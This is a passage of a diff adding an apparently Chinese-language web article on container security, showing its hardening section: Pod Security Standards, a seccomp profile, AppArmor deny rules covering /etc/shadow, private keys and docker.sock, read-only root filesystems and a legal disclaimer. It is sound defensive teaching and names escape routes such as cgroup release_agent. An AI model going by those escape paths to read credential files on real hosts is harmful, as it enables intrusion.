+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">restricted-ns</span>
+<span class="w">  </span><span class="nt">labels</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">pod-security.kubernetes.io/enforce</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">restricted</span>
+<span class="w">    </span><span class="nt">pod-security.kubernetes.io/enforce-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">latest</span>
+<span class="nn">---</span>
+<span class="c1"># Restricted 级别的合规 Pod 示例</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Pod</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">secure-pod</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">automountServiceAccountToken</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+<span class="w">  </span><span class="nt">securityContext</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">runAsNonRoot</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">        </span><span class="c1"># 必须</span>
+<span class="w">    </span><span class="nt">runAsUser</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10001</span>
+<span class="w">    </span><span class="nt">seccompProfile</span><span class="p">:</span><span class="w">           </span><span class="c1"># 必须</span>
+<span class="w">      </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">RuntimeDefault</span>
+<span class="w">  </span><span class="nt">containers</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app</span>
+<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app:v1</span>
+<span class="w">    </span><span class="nt">securityContext</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">allowPrivilegeEscalation</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span><span class="w">   </span><span class="c1"># 必须</span>
+<span class="w">      </span><span class="nt">readOnlyRootFilesystem</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span><span class="w">      </span><span class="c1"># 推荐</span>
+<span class="w">      </span><span class="nt">runAsNonRoot</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+<span class="w">      </span><span class="nt">capabilities</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">drop</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;ALL&quot;</span><span class="p p-Indicator">]</span><span class="w">         </span><span class="c1"># 必须 drop 全部</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">limits</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;256Mi&quot;</span>
+<span class="w">        </span><span class="nt">cpu</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;500m&quot;</span>
+</code></pre></div>
+
+<h4>策略校验工具</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 使用 kubeconform 或 kubectl verify 校验 Pod 是否符合 PSS</span>
+kubectl<span class="w"> </span>label<span class="w"> </span>namespace<span class="w"> </span>prod<span class="w"> </span>pod-security.kubernetes.io/enforce<span class="o">=</span>restricted
+
+<span class="c1"># 部署违反 Restricted 的 Pod 会被 Admission Controller 直接拒绝</span>
+kubectl<span class="w"> </span>apply<span class="w"> </span>-f<span class="w"> </span>privileged-pod.yaml
+<span class="c1"># Error from server (Forbidden): Pod ... is forbidden:</span>
+<span class="c1"># violates PodSecurity &quot;restricted:latest&quot;:</span>
+<span class="c1"># privileged (container &quot;app&quot; must not set securityContext.privileged=true)</span>
+</code></pre></div>
+
+<h3>运行时安全</h3>
+<h4>Seccomp profile</h4>
+<p>Seccomp（Secure Computing Mode）过滤进程可执行的系统调用。Docker 默认 profile 已阻断 <code>mount</code>、<code>init_module</code> 等 44 个危险调用。可进一步定制：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// custom-seccomp.json — 禁止逃逸相关系统调用</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;defaultAction&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SCMP_ACT_ERRNO&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;defaultErrnoRet&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;architectures&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;SCMP_ARCH_X86_64&quot;</span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;syscalls&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;names&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;read&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;write&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;openat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;close&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;stat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;fstat&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;lstat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;poll&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;lseek&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;mmap&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;mprotect&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;munmap&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;brk&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;rt_sigaction&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;rt_sigprocmask&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ioctl&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;exit&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;exit_group&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;clone&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;execve&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;wait4&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;socket&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;connect&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;sendto&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;recvfrom&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;bind&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;listen&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;accept&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SCMP_ACT_ALLOW&quot;</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;names&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">        </span><span class="s2">&quot;mount&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;umount2&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;pivot_root&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;init_module&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;finit_module&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;delete_module&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;ptrace&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;setns&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;unshare&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;keyctl&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="s2">&quot;kexec_load&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;bpf&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;perf_event_open&quot;</span>
+<span class="w">      </span><span class="p">],</span>
+<span class="w">      </span><span class="nt">&quot;action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SCMP_ACT_ERRNO&quot;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># 应用自定义 seccomp profile</span>
+docker<span class="w"> </span>run<span class="w"> </span>--security-opt<span class="w"> </span><span class="nv">seccomp</span><span class="o">=</span>/path/to/custom-seccomp.json<span class="w"> </span>...
+</code></pre></div>
+
+<p>即使保留 <code>CAP_SYS_ADMIN</code>，seccomp 阻断 <code>mount</code> 后，块设备挂载逃逸也会失败。这是纵深防御的关键一层。</p>
+<h4>AppArmor / SELinux 策略</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># AppArmor：限制容器文件访问</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/etc/apparmor.d/container-hardened<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<span class="s">#include &lt;tunables/global&gt;</span>
+<span class="s">profile container-hardened flags=(attach_disconnected,mediate_deleted) {</span>
+<span class="s">  #include &lt;abstractions/base&gt;</span>
+<span class="s">  # 允许容器内正常文件操作</span>
+<span class="s">  /bin/** ix,</span>
+<span class="s">  /usr/** ix,</span>
+<span class="s">  /lib/** r,</span>
+<span class="s">  /etc/ld.so.cache r,</span>
+<span class="s">  # 禁止访问宿主机敏感路径</span>
+<span class="s">  deny /etc/shadow r,</span>
+<span class="s">  deny /etc/ssl/private/** r,</span>
+<span class="s">  deny /root/** rwklx,</span>
+<span class="s">  deny /var/run/docker.sock rw,</span>
+<span class="s">  deny /dev/sd* rwklx,</span>
+<span class="s">  deny /dev/nvme* rwklx,</span>
+<span class="s">  # 禁止 capability 提权</span>
+<span class="s">  deny capability sys_module,</span>
+<span class="s">  deny capability sys_admin,</span>
+<span class="s">  deny capability sys_ptrace,</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 应用</span>
+docker<span class="w"> </span>run<span class="w"> </span>--security-opt<span class="w"> </span><span class="nv">apparmor</span><span class="o">=</span>container-hardened<span class="w"> </span>...
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="c1"># SELinux：在 RHEL/CentOS 上启用 MCS 标签隔离</span>
+<span class="c1"># 确认 SELinux 为 Enforcing</span>
+getenforce
+<span class="c1"># Enforcing</span>
+
+<span class="c1"># Docker 默认为每个容器分配独立的 MCS 标签</span>
+<span class="c1"># 容器进程 type 为 container_t，只能访问 container_file_t 标签的文件</span>
+<span class="c1"># 宿主机文件（如 /etc/shadow 为 shadow_t）自动不可访问</span>
+docker<span class="w"> </span>run<span class="w"> </span>--security-opt<span class="w"> </span><span class="nv">label</span><span class="o">=</span>type:container_t<span class="w"> </span>...
+</code></pre></div>
+
+<h4>只读根文件系统</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 只读根文件系统防止攻击者写入恶意文件（如内核模块、后门）</span>
+docker<span class="w"> </span>run<span class="w"> </span>--read-only<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--tmpfs<span class="w"> </span>/tmp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cap-drop<span class="w"> </span>ALL<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--security-opt<span class="w"> </span>no-new-privileges<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>app:v1
+
+<span class="c1"># K8s 等价配置</span>
+<span class="c1"># spec.containers[].securityContext.readOnlyRootFilesystem: true</span>
+</code></pre></div>
+
+<p>只读根文件系统可有效阻断 cgroup release_agent 逃逸中写入 <code>/cmd</code> 脚本的步骤，以及持久化后门的写入。攻击者无法在容器内写入任何文件，逃逸难度显著提升。</p>
+<h4>综合加固清单</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 生产级安全容器启动模板（综合所有加固措施）</span>
+docker<span class="w"> </span>run<span class="w"> </span>-dit<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--name<span class="w"> </span>secure-app<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cap-drop<span class="w"> </span>ALL<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cap-add<span class="w"> </span>NET_BIND_SERVICE<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--security-opt<span class="w"> </span>no-new-privileges<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--security-opt<span class="w"> </span><span class="nv">seccomp</span><span class="o">=</span>/etc/docker/seccomp-strict.json<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--security-opt<span class="w"> </span><span class="nv">apparmor</span><span class="o">=</span>container-hardened<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--read-only<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--tmpfs<span class="w"> </span>/tmp<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--user<span class="w"> </span><span class="m">10001</span>:10001<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--cgroup-parent<span class="w"> </span>/secure-slice<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--memory<span class="o">=</span>512m<span class="w"> </span>--pids-limit<span class="o">=</span><span class="m">100</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--network<span class="o">=</span>internal<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>app:v1
+</code></pre></div>
+
+<table>
+<thead>
+<tr>
+<th>加固措施</th>
+<th>阻断的逃逸路径</th>
+<th>性能影响</th>
+<th>推荐级别</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>禁用 --privileged</td>
+<td>全部</td>
+<td>无</td>
+<td>必须</td>
+</tr>
+<tr>
+<td>--cap-drop ALL</td>
+<td>mount、insmod、ptrace</td>
+<td>无</td>
+<td>必须</td>
+</tr>
+<tr>
+<td>自定义 seccomp</td>
+<td>mount、init_module、bpf</td>
+<td>极低</td>
+<td>强烈推荐</td>
+</tr>
+<tr>
+<td>AppArmor/SELinux</td>
+<td>文件访问、capability</td>
+<td>低</td>
+<td>强烈推荐</td>
+</tr>
+<tr>
+<td>只读根文件系统</td>
+<td>持久化写入</td>
+<td>低</td>
+<td>推荐</td>
+</tr>
+<tr>
+<td>user namespace remap</td>
+<td>逃逸后权限降级</td>
+<td>中</td>
+<td>推荐</td>
+</tr>
+<tr>
+<td>no-new-privileges</td>
+<td>setuid 提权</td>
+<td>无</td>
+<td>必须</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>免责声明</h2>
+<p>本文档仅供网络安全技术研究与教育目的使用，严禁用于任何未经授权的系统访问或攻击活动。文中所有技术细节、PoC 代码和攻击方法均基于已公开的安全研究与 CVE 披露，旨在帮助安全从业者理解特权容器逃逸的完整攻击路径，从而构建有效的检测与防御体系。</p>
+<p>读者必须在完全由自己拥有或获得明确书面授权的隔离测试环境中复现本文所述技术。未经授权对任何生产系统、他人系统或云上资源进行渗透测试、容器逃逸尝试或权限提升操作，均属于违反《中华人民共和国网络安全法》《数据安全法》《个人信息保护法》及相关法律法规的违法行为，可能面临刑事与民事责任。</p>
+<p>本文作者不对任何人因阅读、引用或使用本文内容而产生的任何直接或间接后果承担责任。读者应自行承担因不当使用本文信息而产生的一切法律责任。若您对本文所述技术的合法性存疑，请在使用前咨询专业法律意见。</p>
+<p>"知攻以知防"——本文的最终目标是帮助容器安全工程师和安全研究者理解攻击者的思维与技术路径，进而在架构设计、配置管理、运行时检测与应急响应等环节构建纵深防御体系，提升云原生基础设施的整体安全水位。</p>
+<hr />
+<blockquote>
+<p><strong>参考来源</strong>：本文技术细节参考 Docker 官方安全文档、Kubernetes Pod Security Standards、CVE-2022-0492（cgroup release_agent）公开分析、Falco 官方规则库及 CNCF 安全最佳实践指南。所有 PoC 均为基于公开技术的复现演示，不包含任何未公开漏洞利用。</p>
+</blockquote>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
